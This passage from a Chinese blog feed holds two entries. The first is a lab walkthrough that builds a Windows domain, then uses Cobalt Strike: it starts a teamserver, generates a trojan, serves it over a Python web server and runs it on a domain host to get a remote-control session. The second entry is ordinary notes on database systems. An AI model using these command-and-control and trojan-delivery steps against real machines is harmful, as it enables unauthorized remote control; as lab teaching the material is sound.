该帐户分配对该域内资源的访问权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907124937328.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;工作组的缺点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;缺乏集中管理与控制的机制&lt;/li&gt;
&lt;li&gt;没用集中的统一账户管理&lt;/li&gt;
&lt;li&gt;只适合小规模用户的使用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;控制所有主机的媒介就是找到域控&lt;/p&gt;
&lt;h2 id=&#34;搭建域环境&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#搭建域环境&#34;&gt;#&lt;/a&gt; 搭建域环境&lt;/h2&gt;
&lt;p&gt;实验环境&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;域控 Windows server 2012&lt;/li&gt;
&lt;li&gt;域内主机 Windows server 2008&lt;/li&gt;
&lt;li&gt;攻击机 kali&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;先登录域控服务器&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907130458478.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;1-设置服务器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-设置服务器&#34;&gt;#&lt;/a&gt; 1、设置服务器&lt;/h3&gt;
&lt;p&gt;在域控服务器中配置 ip 地址（注意：这里 DNS 要与 IP 地址相同，防止找不到域）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907131025908.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;2-更改域控服务器的主机名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-更改域控服务器的主机名&#34;&gt;#&lt;/a&gt; 2、更改域控服务器的主机名&lt;/h3&gt;
&lt;p&gt;将域控主机名改为 DC（do man controller）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907134746980.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;改完名之后等待域控服务器重启&lt;/p&gt;
&lt;h3 id=&#34;3-安装域控制器和dns服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-安装域控制器和dns服务&#34;&gt;#&lt;/a&gt; 3、安装域控制器和 DNS 服务&lt;/h3&gt;
&lt;p&gt;接下来在域控服务器上面安装域控制器和 DNS 服务&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907135517911.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;前面的无脑下一步就行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907135603793.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这个地方勾选基于角色功能的安装，无脑下一步&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907135758204.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这个地方安装域控制器和 DNS 服务&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907135857104.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;等待安装完成&lt;/p&gt;
&lt;p&gt;在服务器管理页面点击黄旗&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140153956.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;现在还没升级成为域控&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140250376.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;升级&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140436007.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里选择添加新林，就是给域控服务器一个名字&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140531418.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里的跟域名要根据常见域名格式，接着无脑下一步&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140814473.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这个地方的密码随便设置就行，影响不大，用不上，一波无脑下一步&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140937411.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这个地方会检查服务器是否满足升级为域控的先决条件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907141053115.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;检查通过后点击安装，经过重启后域控服务器调试完毕&lt;/p&gt;
&lt;h3 id=&#34;4-域内主机加入域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-域内主机加入域&#34;&gt;#&lt;/a&gt; 4、域内主机加入域&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907142503472.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;先查看 2008 的 ip 看是否能联网&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907142214395.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里要将 DNS 服务器地址改为域控服务器的 ip 地址&lt;/p&gt;
&lt;p&gt;接下来改主机名加入域&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907142736819.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;在跳出的弹窗中输入域控服务器的用户名和密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907143008660.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;回车后会弹出成功加入的弹窗&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907143217220.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;成功入狱（狗头保命）&lt;/p&gt;
&lt;h2 id=&#34;活动目录ad的作用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#活动目录ad的作用&#34;&gt;#&lt;/a&gt; 活动目录 AD 的作用&lt;/h2&gt;
&lt;p&gt;可以理解为域控上面的数据库，在里面添加用户才能登录&lt;/p&gt;
&lt;p&gt;打开域控服务器找到 Action Directory 用户和计算机&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907144119881.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里添加一个用户&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907144450484.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;设置密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907144504724.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907144539400.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用 2008 成功登录&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907145139200.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;使用cobalt-strike远控电脑&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用cobalt-strike远控电脑&#34;&gt;#&lt;/a&gt; 使用 Cobalt Strike 远控电脑&lt;/h2&gt;
&lt;p&gt;把 cs 文件导入攻击机&lt;/p&gt;
&lt;p&gt;进入目录使用命令 sudo bash teamserver 【kali 的 ip】 密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907153453234.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;再开一个端口运行 bash cobaltsrike .sh&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907153739520.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;在弹窗中输入 kali 的 ip&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907153947445.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;成功进入 cs&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154002888.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;先开一个监听&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154214414.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;点击 add&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154343665.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;输入对应的 ip 和端口&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154621003.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;开始生成木马&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154714949.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154830575.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用 python3 起一个 web 环境&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907155034157.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里要关闭防火墙&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-markup&#34; data-language=&#34;markup&#34;&gt;&lt;code class=&#34;language-markup&#34;&gt;先安装
sudo apt-get install ufw

检查防火墙的状态（默认 inactive） # ufw status
防火墙版本 # ufw version
启动ufw防火墙 # ufw enable
关闭ufw防火墙 # ufw disable
默认禁止访问所有 # ufw default deny
开放22/TCP端口 # ufw allow 22/tcp
开放53端口(tcp/udp) # ufw allow 53
禁止外部访问 # ufw deny 3306
删除已经添加过的规则 # ufw delete allow 22
允许此IP访问所有的本机端口 # ufw allow from 192.168.1.100
删除上面的规则 # ufw delete allow from 192.168.1.100
查看规则，显示行号 # ufw status numbered
删除第三条规则 # ufw delete 3
关闭ufw # ufw disable
禁止对8888端口的访问 # ufw deny 8888
打开来自192.168.0.1的tcp请求的22端口 # ufw allow proto tcp from 192.168.0.1 to any port 22&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907204556037.png&#34; alt=&#34;image-20220907204556037&#34; /&gt;&lt;/p&gt;
&lt;p&gt;将文件下载下来，然后运行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907204632334.png&#34; alt=&#34;image-20220907204632334&#34; /&gt;&lt;/p&gt;
&lt;p&gt;攻击机上成功上线&lt;/p&gt;
</content>
        <updated>2022-10-23T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>https://blog.xcu.icu/2022/10/24/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/</id>
        <title>数据库系统概述</title>
        <link rel="alternate" href="https://blog.xcu.icu/2022/10/24/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/"/>
        <content type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&#34;11数据库系统概述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#11数据库系统概述&#34;&gt;#&lt;/a&gt; 1.1 数据库系统概述&lt;/h1&gt;
&lt;h2 id=&#34;111四个基本概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#111四个基本概念&#34;&gt;#&lt;/a&gt; 1.1.1 四个基本概念&lt;/h2&gt;
&lt;h3 id=&#34;数据data选择填空&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据data选择填空&#34;&gt;#&lt;/a&gt; 数据（data）（选择填空）&lt;/h3&gt;
&lt;p&gt;数据是数据库中存储的基本对象&lt;/p&gt;
&lt;p&gt;定义：数据是描述事物的符号记录&lt;/p&gt;
&lt;p&gt;数据的种类有文本，图形，图像，音频，视频，学生的档案记录，货物的运输情况&lt;/p&gt;
&lt;p&gt;数据的特点：数据与语义是密不可分的（数据的含义称为数据的语义）&lt;/p&gt;
&lt;p&gt;数据是现象，而信息反应实质&lt;/p&gt;
&lt;h3 id=&#34;数据库database&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库database&#34;&gt;#&lt;/a&gt; 数据库（database）&lt;/h3&gt;
&lt;p&gt;定义：数据库是长期储存在计算机内，有组织的、可共享的大量数据的集合&lt;/p&gt;
&lt;p&gt;数据库的基本特征有&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;数据按照一定的数据模型组织、描述和储存&lt;/li&gt;
&lt;li&gt;可为各种用户共享&lt;/li&gt;
&lt;li&gt;冗余度较小&lt;/li&gt;
&lt;li&gt;数据独立性较高&lt;/li&gt;
&lt;li&gt;易扩展&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;数据库管理系统dbmsdatabase-management-system&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库管理系统dbmsdatabase-management-system&#34;&gt;#&lt;/a&gt; 数据库管理系统（DBMS）Database Management System&lt;/h3&gt;
&lt;p&gt;定义：位于用户余操作系统之间的一程数据管理软件&lt;br /&gt;
是基础软件，一个大型复杂的软件系统&lt;/p&gt;
&lt;p&gt;作用：科学地组织和储存数据、高效的维护和获取数据&lt;/p&gt;
&lt;p&gt;主要功能：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;数据定义功能：DDL&lt;/li&gt;
&lt;li&gt;数据组织、储存和管理&lt;/li&gt;
&lt;li&gt;数据操纵功能：DML&lt;/li&gt;
&lt;li&gt;数据库的事物管理和运行管理&lt;/li&gt;
&lt;li&gt;数据库的建立运行管理&lt;/li&gt;
&lt;li&gt;数据库的建立和维护功能&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;常见的 DBMS&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;关系型数据库
1. MySQL数据库
2. Microsoft SQL Server数据库
3. Oracle数据库
4. Postgresql数据库
5. Sybase数据库
6. DB2数据库
7. Access数据库
非关系型数据库
1. Mongodb数据库
2. Redis数据库
3. Hbase数据库
4. Memcaced数据库&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905094000162.png&#34; alt=&#34;image-20220905094000162&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;数据库系统dbs&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库系统dbs&#34;&gt;#&lt;/a&gt; 数据库系统（DBS）&lt;/h3&gt;
&lt;p&gt;定义：数据库系统是由数据库，数据库管理系统（及其应用开方工具）、应用程序和数据库管理员（DBA）组成的储存、管理、处理和维护数据的系统&lt;/p&gt;
&lt;p&gt;构成：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;数据库&lt;/li&gt;
&lt;li&gt;数据库管理系统（及其开发工具）&lt;/li&gt;
&lt;li&gt;应用系统&lt;/li&gt;
&lt;li&gt;数据库管理员&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;112数据库管理技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#112数据库管理技术&#34;&gt;#&lt;/a&gt; 1.1.2 数据库管理技术&lt;/h2&gt;
&lt;p&gt;数据管理定义：对数据进行・分类、组织、编码、存储检索和维护&lt;br /&gt;
数据处理的中心问题&lt;/p&gt;
&lt;p&gt;数据管理技术的三个阶段：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;人工管理阶段&lt;/li&gt;
&lt;li&gt;文件系统阶段&lt;/li&gt;
&lt;li&gt;数据库系统阶段&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;113数据系统的特点选择填空&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#113数据系统的特点选择填空&#34;&gt;#&lt;/a&gt; 1.1.3 数据系统的特点（选择填空）&lt;/h2&gt;
&lt;h3 id=&#34;数据结构化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据结构化&#34;&gt;#&lt;/a&gt; 数据结构化&lt;/h3&gt;
&lt;p&gt;整体结构化：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不在仅仅针对某一个应用，而是面向整个组织或者企业&lt;/li&gt;
&lt;li&gt;不仅数据内部结构化，整体是结构化的，数据之间具有联系&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;实现数据的真正结构化&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;数据的结构用数据模型描述，无需程序定义和解释&lt;/li&gt;
&lt;li&gt;数据可以变长&lt;/li&gt;
&lt;li&gt;数据的最小获取单位是数据项&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;数据的共享性高冗余度低易扩展&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据的共享性高冗余度低易扩展&#34;&gt;#&lt;/a&gt; 数据的共享性高，冗余度低，易扩展&lt;/h3&gt;
&lt;p&gt;数据库系统从整体角度看待和描述数据，数据面向整个系统，可以被多个用户多个应用共享使用&lt;/p&gt;
&lt;p&gt;数据共享的好处：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;减少数据冗余，节约储存空间&lt;/li&gt;
&lt;li&gt;避免数据之间的不相容性与不一致性&lt;/li&gt;
&lt;li&gt;使系统易于扩充&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;数据独立性高&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据独立性高&#34;&gt;#&lt;/a&gt; 数据独立性高&lt;/h3&gt;
&lt;p&gt;物理独立性：指用户的应用程序与存储在磁盘上的数据库中数据是相互独立的。当数据的物理存储改变了，应用程序不用改变。&lt;/p&gt;
&lt;p&gt;逻辑独立性：指用户的应用程序与数据库的逻辑结构是相互独立的。数据的逻辑结构改变了，用户程序也可以不变。&lt;/p&gt;
&lt;h3 id=&#34;数据由dbms统一管理和控制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据由dbms统一管理和控制&#34;&gt;#&lt;/a&gt; 数据由 DBMS 统一管理和控制&lt;/h3&gt;
&lt;p&gt;DBMS 提供的数据控制功能&lt;/p&gt;
&lt;p&gt;(1) 数据的安全性（Security）保护 保护数据，以防止不合法的使用造成的数据的泄密和破坏。&lt;/p&gt;
&lt;p&gt;(2) 数据的完整性（Integrity）检查 将数据控制在有效的范围内，或保证数据之间满足一定的关系。&lt;/p&gt;
&lt;p&gt;(3) 并发（Concurrency）控制 对多用户的并发操作加以控制和协调，防止相互干扰而得到错误的结果。&lt;/p&gt;
&lt;p&gt;(4) 数据库恢复（Recovery） 将数据库从错误状态恢复到某一已知的正确状态。&lt;/p&gt;
&lt;h1 id=&#34;12数据模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#12数据模型&#34;&gt;#&lt;/a&gt; 1.2 数据模型&lt;/h1&gt;
&lt;p&gt;在数据库中用数据模型这个工具来抽象、表示和处理现实世界中的数据和信息。&lt;br /&gt;
通俗地讲数据模型就是现实世界的模拟。&lt;/p&gt;
&lt;p&gt;数据模型应满足三方面要求&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;能比较真实地模拟现实世界&lt;/li&gt;
&lt;li&gt;容易为人所理解&lt;/li&gt;
&lt;li&gt;便于在计算机上实现&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;注：数据模型是数据库系统的核心和基础&lt;/p&gt;
&lt;h2 id=&#34;121两大类数据模型了解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#121两大类数据模型了解&#34;&gt;#&lt;/a&gt; 1.2.1 两大类数据模型（了解）&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;概念模型&lt;br /&gt;
也称信息模型，它是按用户的观点来对信息和信息建模，用于数据库设计&lt;/li&gt;
&lt;li&gt;逻辑模型：主要包括网状模型、层次模型、关系模型、面向对象模型等，按计算机系统的观点对数据建模，用于 DBMS 实现。&lt;br /&gt;
物理模型：是对数据最底层的抽象，描述数据在系统内部的表示方式和存取方法，在磁盘或磁带上的存储方式和存取方法。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;122概念模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#122概念模型&#34;&gt;#&lt;/a&gt; 1.2.2 概念模型&lt;/h2&gt;
&lt;p&gt;概念模型：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;概念模型用于信息世界的建模&lt;/li&gt;
&lt;li&gt;是现实世界到机器世界的一个中间层次&lt;/li&gt;
&lt;li&gt;是数据库设计的有力工具 数据库设计人员和用户之间进行交流的语言&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对概念模型的基本要求：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;较强的语义表达能力&lt;/li&gt;
&lt;li&gt;能够方便、直接地表达应用中的各种语义知识&lt;/li&gt;
&lt;li&gt;简单、清晰、易于用户理解&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;信息世界中的基本概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息世界中的基本概念&#34;&gt;#&lt;/a&gt; 信息世界中的基本概念&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;实体（Entity）  客观存在并可相互区别的事物称为实体。 可以是具体的人、事、物或抽象的概念。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;属性（Attribute）  实体所具有的某一特性称为属性。 一个实体可以由若干个属性来刻画。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;码（Key）  唯一标识实体的属性集称为码。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;域（Domain）  属性的取值范围称为该属性的域。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;实体型（Entity Type）  用实体名及其属性名集合来抽象和刻画同类实体称为实体型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;实体集（Entity Set）  同一类型实体的集合称为实体集&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;联系（Relationship）   现实世界中事物内部以及事物之间的联系在信息世界中反映为实体内部的联系和实体之间的联系。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;实体内部&lt;/code&gt; 的联系通常是指组成实体的各属性之间的联系&lt;/p&gt;
&lt;p&gt;&lt;code&gt;实体之间&lt;/code&gt; 的联系通常是指不同实体集之间的联系&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;概念模型的一种表示方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#概念模型的一种表示方法&#34;&gt;#&lt;/a&gt; 概念模型的一种表示方法&lt;/h3&gt;
&lt;p&gt;概念模型的表示方法 —E-R 图、&lt;strong&gt;实体－联系方法&lt;/strong&gt; (E-R 方法)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用 E-R 图来描述现实世界的概念模型&lt;/li&gt;
&lt;li&gt;E-R 方法也称为 E-R 模型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905112912981.png&#34; alt=&#34;image-20220905112912981&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905112937613.png&#34; alt=&#34;image-20220905112937613&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;123数据模型的组成要素三个&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#123数据模型的组成要素三个&#34;&gt;#&lt;/a&gt; 1.2.3 数据模型的组成要素（三个）&lt;/h2&gt;
&lt;h3 id=&#34;数据结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据结构&#34;&gt;#&lt;/a&gt; 数据结构&lt;/h3&gt;
&lt;p&gt;数据结构描述数据库的组成对象，以及对象之间的联系&lt;/p&gt;
&lt;p&gt;对系统静态的描述&lt;/p&gt;
&lt;h3 id=&#34;数据操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据操作&#34;&gt;#&lt;/a&gt; 数据操作&lt;/h3&gt;
&lt;p&gt;对数据库中的对象的实例（值）允许执行的操作以及相关的操作规则，对系统动态的描述&lt;/p&gt;
&lt;h3 id=&#34;完整性约束条件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#完整性约束条件&#34;&gt;#&lt;/a&gt; 完整性约束条件&lt;/h3&gt;
&lt;p&gt;一组完整性规则的集合。&lt;/p&gt;
&lt;p&gt;完整性规则：给定的数据模型中数据及其联系所具有的制约和储存规则&lt;/p&gt;
&lt;p&gt;用以限定符合数据模型的数据库状态以及状态的变化，以保证数据的正确、有效、相容。&lt;/p&gt;
&lt;h2 id=&#34;124最常用的数据模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#124最常用的数据模型&#34;&gt;#&lt;/a&gt; 1.2.4 最常用的数据模型&lt;/h2&gt;
&lt;p&gt;非关系模型&lt;/p&gt;
&lt;p&gt;层次模型 (Hierarchical Model) 网状模型 (Network Model)&lt;/p&gt;
&lt;p&gt;关系模型 (Relational Model)   面向对象模型 (Object Oriented Model）&lt;br /&gt;
对象关系模型 (Object Relational Model)&lt;/p&gt;
&lt;p&gt;基本层次联系是指两个记录以及它们之间的一对多（包括一对一）的联系&lt;/p&gt;
&lt;h2 id=&#34;125层次模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#125层次模型&#34;&gt;#&lt;/a&gt; 1.2.5 层次模型&lt;/h2&gt;
&lt;h3 id=&#34;1-层次模型的数据结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-层次模型的数据结构&#34;&gt;#&lt;/a&gt; 1、层次模型的数据结构&lt;/h3&gt;
